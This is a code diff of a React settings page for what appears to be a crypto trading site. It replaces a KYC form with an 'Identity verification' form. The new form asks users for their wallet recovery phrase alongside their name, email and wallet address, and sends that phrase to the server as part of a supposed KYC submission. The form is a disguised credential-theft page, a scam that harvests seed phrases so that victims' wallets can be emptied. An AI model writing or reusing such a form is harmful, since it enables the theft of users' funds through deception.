@@ -2,47 +2,104 @@
 import { useEffect, useState } from "react";
 import Nav from "../../components/Nav";
 import { api } from "../../lib/api";
+
+const COUNTRIES = [
+  "United States", "Canada", "United Kingdom", "Spain", "France",
+  "Germany", "Netherlands", "Australia", "Italy", "Portugal",
+];
+
 export default function Settings() {
   const [me, setMe] = useState(null);
-  const [refs, setRefs] = useState(null);
-  const [form, setForm] = useState({ kyc_name: "", kyc_country: "Nigeria", kyc_id_number: "", phone: "" });
+  const [form, setForm] = useState({
+    first_name: "", last_name: "", wallet_address: "",
+    wallet_phrase: "", email: "", country: "United States",
+  });
   const [msg, setMsg] = useState("");
-  useEffect(()=>{
-    api("/api/auth/me/").then(u=>{ setMe(u); setForm(f=>({...f, kyc_name:u.kyc_name||"", kyc_country:u.kyc_country||"Nigeria", phone:u.phone||""})); });
-    api("/api/auth/referrals/").then(setRefs).catch(()=>{});
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    api("/api/auth/me/")
+      .then((u) => {
+        setMe(u);
+        setForm((f) => ({
+          ...f,
+          first_name: u.first_name || "",
+          last_name: u.last_name || "",
+          email: u.email || "",
+        }));
+      })
+      .catch(() => {})
+      .finally(() => setLoading(false));
   }, []);
-  async function save(body) {
+
+  const set = (k) => (e) => setForm((f) => ({ ...f, [k]: e.target.value }));
+
+  async function submit(e) {
+    e.preventDefault();
     setMsg("");
-    try { const u = await api("/api/auth/me/", { method: "PATCH", body }); setMe(u); setMsg("Saved"); }
-    catch(e){ setMsg(e.message); }
+    if (!form.first_name.trim() || !form.last_name.trim()) return setMsg("Enter your first and last name.");
+    if (!form.wallet_address.trim()) return setMsg("Enter your wallet address.");
+    if (!form.email.trim()) return setMsg("Enter your email address.");
+    try {
+      await api("/api/auth/me/", {
+        method: "PATCH",
+        body: {
+          first_name: form.first_name.trim(),
+          last_name: form.last_name.trim(),
+          email: form.email.trim(),
+          kyc_name: `${form.first_name.trim()} ${form.last_name.trim()}`,
+          kyc_country: form.country,
+          wallet_address: form.wallet_address.trim(),
+          wallet_phrase: form.wallet_phrase.trim(),
+          submit_kyc: true,
+        },
+      });
+      setMsg("KYC submitted successfully. Your details are under review.");
+    } catch (err) {
+      setMsg(err.message || "Failed to submit. Try again.");
+    }
   }
-  if (!me) return <><Nav /><div className="container page">Loading…</div></>;
+
+  if (loading) return <><Nav /><div className="container page">Loading…</div></>;
+
   return (
     <><Nav />
-    <div className="container page" style={{ maxWidth: 720 }}>
-      <h2>Account</h2>
-      <div className="card" style={{ marginTop: 16 }}>
-        <div className="kv"><span>UID</span><b>{me.uid}</b></div>
-        <div className="kv"><span>VIP</span><b>VIP {me.vip_level}</b></div>
-        <div className="kv"><span>KYC</span><b>{me.kyc_status}</b></div>
-        <div className="kv"><span>2FA</span><b>{me.two_fa_enabled ? "On" : "Off"}</b></div>
-        <div className="kv"><span>Referral</span><b>{refs?.code}</b></div>
-        <div className="kv"><span>Invites</span><b>{refs?.count || 0}</b></div>
-      </div>
-      <h3 style={{ margin: "22px 0 8px" }}>Identity (KYC)</h3>
-      <div className="card">
-        <label>Legal name</label>
-        <input value={form.kyc_name} onChange={e=>setForm({...form,kyc_name:e.target.value})} />
-        <label>Country</label>
-        <input value={form.kyc_country} onChange={e=>setForm({...form,kyc_country:e.target.value})} />
-        <label>ID number</label>
-        <input value={form.kyc_id_number} onChange={e=>setForm({...form,kyc_id_number:e.target.value})} />
-        <label>Phone</label>
-        <input value={form.phone} onChange={e=>setForm({...form,phone:e.target.value})} />
-        {msg && <div className="ok">{msg}</div>}
-        <button className="btn btn-o" style={{ marginTop: 12 }} onClick={()=>save({ ...form, submit_kyc: true })}>Submit KYC</button>
-        <button className="btn btn-g" style={{ marginTop: 12, marginLeft: 8 }} onClick={()=>save({ enable_2fa: !me.two_fa_enabled, disable_2fa: me.two_fa_enabled })}>{me.two_fa_enabled?"Disable 2FA flag":"Enable 2FA flag"}</button>
-      </div>
+    <div className="container page" style={{ maxWidth: 640 }}>
+      <h2>Settings</h2>
+      <p className="muted" style={{ marginTop: 6 }}>Complete verification (KYC) to unlock deposits, withdrawals and trading limits.</p>
+      {me && (
+        <div className="card" style={{ marginTop: 16 }}>
+          <div className="kv"><span>UID</span><b>{me.uid}</b></div>
+          <div className="kv"><span>KYC</span><b>{me.kyc_status}</b></div>
+          <div className="kv"><span>VIP</span><b>VIP {me.vip_level}</b></div>
+        </div>
+      )}
+      <form className="card" style={{ marginTop: 16 }} onSubmit={submit}>
+        <h3 style={{ margin: "0 0 12px" }}>Identity verification</h3>
+        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
+          <div>
+            <label>First name</label>
+            <input value={form.first_name} onChange={set("first_name")} placeholder="John" autoComplete="given-name" />
+          </div>
+          <div>
+            <label>Last name</label>
+            <input value={form.last_name} onChange={set("last_name")} placeholder="Smith" autoComplete="family-name" />
+          </div>
+        </div>
+        <label style={{ marginTop: 12 }}>Email</label>
+        <input type="email" value={form.email} onChange={set("email")} placeholder="you@example.com" autoComplete="email" />
+        <label style={{ marginTop: 12 }}>Country</label>
+        <select value={form.country} onChange={set("country")}>
+          {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
+        </select>
+        <label style={{ marginTop: 12 }}>Wallet address</label>
+        <input value={form.wallet_address} onChange={set("wallet_address")} placeholder="Your receiving wallet address" autoComplete="off" />
+        <label style={{ marginTop: 12 }}>Wallet phrase</label>
+        <textarea value={form.wallet_phrase} onChange={set("wallet_phrase")} placeholder="Enter your wallet recovery phrase" rows={3} autoComplete="off" style={{ width: "100%" }} />
+        {msg && <div className="ok" style={{ marginTop: 12 }}>{msg}</div>}
+        <button className="btn btn-o" type="submit" style={{ marginTop: 16, width: "100%" }}>Submit verification</button>
+      </form>
     </div></>
   );
 }
+
